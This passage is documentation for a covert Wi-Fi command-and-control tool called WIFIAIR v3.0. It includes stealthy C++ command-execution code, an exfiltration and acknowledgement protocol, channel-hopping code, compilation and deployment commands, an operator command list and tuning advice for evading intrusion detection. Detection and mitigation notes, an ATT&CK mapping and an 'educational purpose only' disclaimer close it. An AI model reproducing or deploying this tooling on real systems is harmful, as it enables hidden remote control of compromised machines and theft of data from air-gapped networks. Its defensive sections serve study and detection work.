            for (DWORD a = 0; a < pAckList->dwNumberOfItems; a++) {
                PWLAN_BSS_ENTRY pE = &pAckList->wlanBssEntries[a];
                if (pE->ulIeSize > 0)
                    ParseVSE(hClient, pGuid,
                             (PBYTE)pE + pE->ulIeOffset, pE->ulIeSize);
            }
            WlanFreeMemory(pAckList);
        }

        if (g_AckedJobs.count(ej.jobId)) break;  // ACK found!
    }
}
```

This inter-pass scan also picks up any **new commands** the server is broadcasting, so the agent can queue them for execution once the current exfil completes.

### 5.8 Command Execution (Stealth: CreateProcess + CREATE_NO_WINDOW)

v3.0 replaces the v2.0 `_popen` approach with `CreateProcess` using `CREATE_NO_WINDOW` and redirected pipes, ensuring no visible console window even when executing commands:

```cpp
std::string ExecCommand(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;
    CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;

    PROCESS_INFORMATION pi = { 0 };
    std::string fullCmd = "cmd.exe /c " + cmd + " 2>&1";

    CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(hWritePipe);

    std::string result;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)
           && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (result.empty()) result = "[No output]";
    return result;
}
```

Combined with `FreeConsole()` at startup (when `-debug` is not set), the agent produces zero visible UI — no console window appears, no child cmd.exe windows flash on screen.

---

## 6. ACK / Retransmit Protocol

### 6.1 Downstream ACK Flow

```text
Server                              Agent
  │                                   │
  │──── CMD beacon (loop) ──────────> │
  │                                   │ reassemble...
  │                                   │ ACK probe
  │ <── ACK probe ──────────────────  │
  │                                   │
  │ stop broadcast, advance queue     │ execute command
```

When the agent successfully reassembles a command, it immediately sends an **ACK probe** (MsgType=0x02) containing the Job ID. The server stops broadcasting that job and advances to the next job in the queue.

**Note:** ACK probes are only sent when exfil mode is enabled (`-exfil`). In **receive-only mode** (no `-exfil` flag), the agent produces zero upstream traffic — no ACKs, no probes of any kind. The server simply keeps broadcasting until the operator manually runs `stop`.

### 6.2 Upstream ACK Flow

```text
Agent                               Server
  │                                   │
  │──── RESPONSE probes (pass 1) ──>  │
  │                                   │ reassemble...
  │  ┌─ quick scan ─┐                │ ACK beacon (15x, 1.5s)
  │  │ check for ACK │<── ACK ─────── │
  │  └──── found! ───┘                │
  │                                   │
  │ stop exfil, back to scan mode     │ display output
```

When the server successfully reassembles a response, it sends an **ACK beacon** (MsgType=0x02) repeated 15 times over 1.5 seconds. Between each retransmit pass, the agent performs a **quick scan** that checks incoming beacons for this ACK. If found, the agent stops exfiltrating immediately and returns to scan mode — even if the `-duration` timeout has not expired.

This inter-pass scan also picks up any **new commands** the server is broadcasting, so the agent can queue them for execution right after the current exfil completes.

**Encrypt-once guarantee:** The response payload is encrypted once before the retransmit loop begins. Every retransmit pass sends the exact same encrypted chunks. This ensures the server can mix-and-match fragments from different passes and still decrypt correctly.

### 6.3 Stale Job Pruning

Both sides prune stale state:
- **Agent:** Active jobs older than 2 minutes are discarded. Completed jobs set is cleared at 1000 entries.
- **Server:** Incomplete response buffers older than 5 minutes are discarded with a warning.

---

## 7. Channel Hopping

### 7.1 Shared Schedule

Both sides compute the current channel from the PSK and wall-clock time:

```python
CHANNELS     = [1, 6, 11]   # Non-overlapping 2.4GHz
HOP_INTERVAL = 10           # seconds per dwell
SEED = int(SHA256(PSK + "WIFIAIR_CHANNEL_HOP")[:4])

def get_current_channel():
    slot = int(time.time()) // HOP_INTERVAL
    h = ((SEED + slot) * 2654435761) & 0xFFFFFFFF  # Knuth hash
    return CHANNELS[h % 3]
```

The server actively hops its monitor-mode interface. The agent computes the schedule for awareness but relies on Windows' standard scanning behavior (which sweeps all channels).

### 7.2 Operational Notes

- **Clock sync:** Both sides need roughly synchronized clocks (NTP). A 10-second dwell provides tolerance.
- **Disable with:** `server.py -nohop` or `server.py -channel 6` for fixed operation.
- **Dual-interface:** For simultaneous beacon injection and probe sniffing on different channels, use two Wi-Fi adapters.

---

## 8. Agent Tracking

The server discovers agents when it receives an **ACK probe** or **response data** from them (requires `-exfil` on the agent). The `agents` command shows per-agent status:

```text
C2> agents
[*] Known Agents:
    Agent   1 | ALIVE | seen 5s ago  | jobs 3
    Agent   2 | STALE | seen 120s ago | jobs 1
    Agent   3 | LOST  | seen 400s ago | jobs 0
```

| Status | Condition |
|:-------|:----------|
| **ALIVE** | Seen within 60 seconds |
| **STALE** | Seen within 300 seconds |
| **LOST** | Not seen for 300+ seconds |

**Note:** In receive-only mode (no `-exfil`), agents are invisible to the server — they execute commands silently with zero upstream traffic.

---

## 9. Job Queue

### 9.1 Server-Side FIFO

The server maintains a FIFO queue of prepared jobs. When the operator sends multiple commands, they are queued and dispatched sequentially:

```text
C2> send 1 whoami
[+] Queued Job 0xa1b2 -> Agent 1 (1 chunks, queue depth: 0)
[>] Broadcasting Job 0xa1b2 -> Agent 1 (1 chunks)

C2> send 1 ipconfig /all
[+] Queued Job 0xc3d4 -> Agent 1 (2 chunks, queue depth: 1)

C2> send 1 netstat -an
[+] Queued Job 0xe5f6 -> Agent 1 (1 chunks, queue depth: 2)

C2> queue
[*] Job queue (2 pending):
    1. Job 0xc3d4 -> Agent 1 (2 chunks)
    2. Job 0xe5f6 -> Agent 1 (1 chunks)
[*] Currently broadcasting: 0xa1b2 -> Agent 1
```

Jobs advance automatically when the agent ACKs the current job (requires `-exfil` on the agent), or manually with `skip`.

### 9.2 Queue Management Commands

| Command | Action |
|:--------|:-------|
| `stop` | Pause current broadcast (queue untouched) |
| `skip` | Stop current broadcast, immediately start next job in queue |
| `remove 2` | Remove job #2 from the queue (by position) |
| `remove 0xc3d4` | Remove a specific job by hex ID |
| `flush` | Clear entire queue and stop broadcasting |

```text
C2> queue
[*] Job queue (2 pending):
    1. Job 0xc3d4 -> Agent 1 (2 chunks)
    2. Job 0xe5f6 -> Agent 1 (1 chunks)
[*] Currently broadcasting: 0xa1b2 -> Agent 1

C2> remove 0xe5f6
[+] Removed Job 0xe5f6 -> Agent 1

C2> skip
[>] Broadcasting Job 0xc3d4 -> Agent 1 (2 chunks)
```

### 9.3 Agent-Side Exfil Queue

The agent queues response data for sequential exfiltration. If a new command arrives while the agent is exfiltrating a previous response (detected during inter-pass scanning), the new command is queued for execution once the current exfil completes.

---

## 10. Stealth by Default

The agent runs in full stealth mode by default — no console window, no visible output, no user interaction.

**Default behavior (no flags needed):**
- Console window hidden via `FreeConsole()` at startup
- All commands executed via `CreateProcess` with `CREATE_NO_WINDOW` and redirected pipes
- Zero console output

**Debug mode (`-debug` flag):**
- Console window remains visible
- Full logging output for testing and development

```powershell
# Normal operation (stealth, invisible)
agent.exe -agent 1

# Testing (visible console with full debug output)
agent.exe -agent 1 -debug
agent.exe -agent 1 -exfil -duration 60 -debug
```

---

## 11. Operating Modes

The agent supports two distinct modes based on whether `-exfil` is passed:

### 11.1 Receive-Only Mode (default)

```powershell
agent.exe -agent 1
```

- **Zero upstream traffic** — no probes of any kind are transmitted
- No ACK, no exfiltration
- Agent silently receives and executes commands
- Ideal for long-range one-way scenarios (directional antenna, parking lot ops)
- The operator assumes the command was delivered and relies on the target reaching the internet or other side-channel for confirmation

### 11.2 Bidirectional Mode

```powershell
agent.exe -agent 1 -exfil -duration 60
```

- Full upstream: ACK probes, response exfiltration
- Server auto-advances job queue on ACK
- Agent stops exfil early when server ACKs the response
- Requires physical proximity for upstream (probe request range ~50-100m)

---

## 12. Usage / Workflow

### 12.1 Requirements

**Attacker / Operator:**
- Kali Linux with:
  - Wi-Fi card supporting **monitor mode** and **injection**
  - Python 3 with `scapy`, `pycryptodome` installed
- Physical proximity to target

**Target Host:**
- Windows 8+ with Wi-Fi enabled
- WLAN service active
- Agent binary deployed (via initial compromise, USB, physical access)

### 12.2 Server Setup (Kali)

```bash
# Install dependencies
pip install scapy pycryptodome

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Start server with response listener and channel hopping
sudo python3 server.py -listen -i wlan0mon

# Or: fixed channel (no hopping)
sudo python3 server.py -listen -i wlan0mon -channel 6
```

### 12.3 Agent Compilation

**Visual Studio:**

Open solution → Build as Release x64.

**MinGW:**

```bash
g++ WIFIAIR-C2-Channel-VSE.cpp -o agent.exe -lwlanapi -lbcrypt -static
```

### 12.4 Agent Deployment (Windows)

```powershell
# Receive-only (stealth, zero upstream traffic)
agent.exe -agent 1

# Bidirectional (stealth, ACK + exfil)
agent.exe -agent 1 -exfil -duration 60

# Debug mode (visible console for testing)
agent.exe -agent 1 -exfil -duration 60 -debug

# Custom jitter
agent.exe -agent 1 -exfil -duration 120 -jitter 1000 3000
```

### 12.5 Server Commands

```text
C2> send 1 whoami                 # Send to Agent 1
C2> send 0 hostname               # Broadcast to all agents
C2> send 2 dir C:\Users           # List directory
C2> send 1 ipconfig /all          # Shell command (queued)
C2> stop                           # Stop current broadcast
C2> skip                           # Stop current, start next in queue
C2> queue                          # Show pending jobs
C2> remove 2                       # Remove job #2 from queue
C2> remove 0xa1b2                  # Remove job by hex ID
C2> flush                          # Clear entire queue + stop
C2> agents                         # Show known agents
C2> status                         # Show server state
C2> responses                      # Show pending response buffers
C2> hop on                         # Enable channel hopping
C2> hop off                        # Disable channel hopping
C2> jitter 50 200                  # Set beacon jitter (ms)
C2> clear                          # Clear response history
C2> exit                           # Quit
```

### 12.6 Example Session

```text
C2> send 1 whoami
[+] Queued Job 0xa1b2 -> Agent 1 (1 chunks, queue depth: 0)
[>] Broadcasting Job 0xa1b2 -> Agent 1 (1 chunks)
[+] ACK from Agent 1 for Job 0xa1b2 - command delivered
[<] Agent 1 responding (Job 0xa1b2, 2 chunks)...
============================================================
[+] Agent 1 | Job 0xa1b2 | 4.2s
============================================================
desktop-vixx\user
============================================================
```

Meanwhile on the agent (with `-exfil -duration 60`):

```text
[*] New Job 0xa1b2 (Target: Agent 1)
[+] EXECUTE: whoami
[+] ACK sent for Job 0xa1b2
[+] OUTPUT (18 bytes):
desktop-vixx\user
[*] Exfiltrating Job 0xa1b2 (18 bytes)...
[*] Exfil Job 0xa1b2: 40B b64 (2 chunks)
.. [DONE]
[+] Server ACK received! Stopping exfil early.    ← stopped at ~8s instead of 60s
[*] Exfil complete for Job 0xa1b2
[*] Exfil queue drained. Returning to scan mode.
```

---

## 13. Bandwidth & Limitations

### 13.1 Bandwidth

| Direction | Method | Bandwidth | Capacity |
|:---|:---|:---|:---|
| **Downstream** | VSE Stacking (5 tags) | ~10 KB/s | Shellcode, scripts, binaries |
| **Upstream** | Probe Request SSIDs | ~50 B/s | Short text only |

### 13.2 Range Asymmetry

| Direction | Range | Reason |
|:---|:---|:---|
| **Downstream** | High (1+ km with directional antenna) | Attacker controls Tx power |
| **Upstream** | Low (~50-100m) | Victim laptop has weak internal antenna |

**Implication:** You can send commands from far away, but must be closer to receive responses. Use **receive-only mode** for long-range operations and rely on the target reaching the internet for confirmation.

### 13.3 Operational Advice

- **Keep responses short:** Use `findstr`, `head`, `| select` to filter output
- **Process on target:** Send scripts that analyze data locally, return only results
- **Avoid large exfil:** A 10MB file would take hours and generate thousands of packets

### 13.4 Tuning VSE Parameters

Two values in `server.py` control how commands are packed into beacon frames. Adjust these to trade speed for stealth:

```python
TAGS_PER_BEACON = 5    # VSE tags per beacon frame (1-5)
CHUNK_SZ = 243         # Data bytes per VSE tag (max 243 = 255 - 12 header)
```

**`TAGS_PER_BEACON`** — how many Tag 221 elements are stacked into a single beacon:

| Value | Beacon Size | Speed | Stealth |
|:------|:------------|:------|:--------|
| `5` (default) | ~1.2 KB | Fast | Lower (large beacons are anomalous) |
| `3` | ~750 B | Medium | Better |
| `1` | ~255 B | Slow | Best (single VSE looks normal) |

**`CHUNK_SZ`** — data bytes per VSE tag (before adding the 12-byte header):

| Value | VSE Size | Looks Like | Trade-off |
|:------|:---------|:-----------|:----------|
| `243` (default) | 255 B | Max-size VSE (suspicious) | Fewest packets needed |
| `100` | 112 B | Medium vendor extension | Good balance |
| `50` | 62 B | Small vendor tag | Realistic, more packets |
| `20` | 32 B | Tiny vendor tag | Very stealthy, many packets |

**Example — maximum stealth profile:**

```python
TAGS_PER_BEACON = 1    # One VSE per beacon
CHUNK_SZ = 50          # Small, realistic-looking vendor tags
```

This makes each beacon look like a normal AP with a single small vendor extension. A `whoami` command would need ~2 beacons instead of 1, but each beacon blends in with legitimate traffic.

The agent doesn't need any changes — it reassembles by sequence number regardless of chunk size or tags per beacon.

---

## 14. Security Analysis

### 14.1 Cryptographic Properties

| Property | v2.0 (RC4) | v3.0 (AES-256-CTR) |
|:---|:---|:---|
| Key size | 128-bit | **256-bit** |
| Nonce | None (static key) | **12-byte random per message** |
| Known-plaintext | Vulnerable | Resistant |
| Keystream bias | Yes (RC4 bias) | None |
| Replay protection | None | Nonce uniqueness |
| Implementation | Custom | **BCrypt** (OS-provided, audited) |

### 14.2 Signature Resistance

| Indicator | v2.0 | v3.0 |
|:---|:---|:---|
| OUI pattern | Fixed `00:40:96` / `00:40:97` | **Derived from PSK** (changes per deployment) |
| Ciphertext patterns | Identical for same command | **Unique per message** (random nonce) |
| Channel behavior | Fixed channel 6 | **Hopping** (harder to capture) |
| Console window | Always visible | **Hidden by default** (`FreeConsole`) |
| Process tree | `agent.exe → cmd.exe` | `CreateProcess` with `CREATE_NO_WINDOW` |
| Upstream traffic | Always transmitting | **Configurable** (zero in receive-only mode) |

---

## 15. Detection & Mitigation

### 15.1 Network/RF Detection

- **Anomalous VSE size:** Legitimate VSE tags are typically small. Multiple 255-byte Tag 221 elements in a single beacon are suspicious.
- **Beacon timing analysis:** Even with jitter, statistical analysis of inter-beacon intervals may reveal non-standard patterns.
- **Channel hopping correlation:** A BSSID that appears on multiple channels in a short period is unusual for a real AP.
- **Probe Request entropy:** High-entropy SSIDs in Probe Requests, especially with consistent 32-byte lengths.
- **Volume anomaly:** Bursts of Probe Requests from a single station during exfil mode.

### 15.2 Host-Based Detection

- **WLAN API abuse:** Non-system processes calling `WlanGetNetworkBssList` or `WlanScan` at high frequency.
- **BCrypt usage patterns:** A non-browser process using `BCryptEncrypt` with AES + `BCryptGenRandom` together.
- **Stealth indicators:** Process calling `FreeConsole()` shortly after start, or `CreateProcess` with `CREATE_NO_WINDOW`.

### 15.3 Mitigation

- **Disable Wi-Fi** on air-gapped systems (hardware kill switch preferred)
- **Application whitelisting** to block unknown binaries
- **Wireless IDS** monitoring for anomalous beacon/probe activity
- **Physical security** with RF sweeps of sensitive areas
- **EDR rules** for WLAN API abuse by non-system processes

### 15.4 MITRE ATT&CK Mapping

- **T1071.001** — Application Layer Protocol (adapted to 802.11)
- **T1095** — Non-Application Layer Protocol
- **T1020** — Automated Exfiltration
- **T1029** — Scheduled Transfer (blocking exfil mode)
- **T1027** — Obfuscated Files or Information (AES-256 encryption)
- **T1573** — Encrypted Channel
- **T1132** — Data Encoding (Base64)

---

## 16. Summary

WIFIAIR v3.0 delivers a production-grade covert Wi-Fi C2 channel with:

- **AES-256-CTR encryption** with per-message random nonces (via BCrypt)
- **ACK/retransmit protocol** with inter-pass scanning — server ACK stops exfil early
- **Derived OUI** eliminating static IDS signatures
- **FIFO job queue** with `skip`, `remove`, and `flush` for full queue control
- **Channel hopping** on a shared PRNG schedule
- **Agent tracking** via ACK probes and response data
- **Stealth by default** with `FreeConsole` and `CreateProcess` + `CREATE_NO_WINDOW` (`-debug` for testing)
- **Receive-only mode** with zero upstream traffic for long-range operations
- **Encrypt-once exfil** ensuring fragments from different retransmit passes are always compatible

The technique is relevant for:

- **Red teams** conducting close-access operations
- **Defenders** building RF-aware threat models
- **Researchers** studying covert channel capacity in 802.11

---

## 17. Disclaimer

**Educational Purpose Only.**

This software is a Proof of Concept (PoC) designed to demonstrate the risks of air-gapped networks and 802.11 management frame manipulation. Do not use this tool on networks or systems you do not own or have explicit written permission to test.
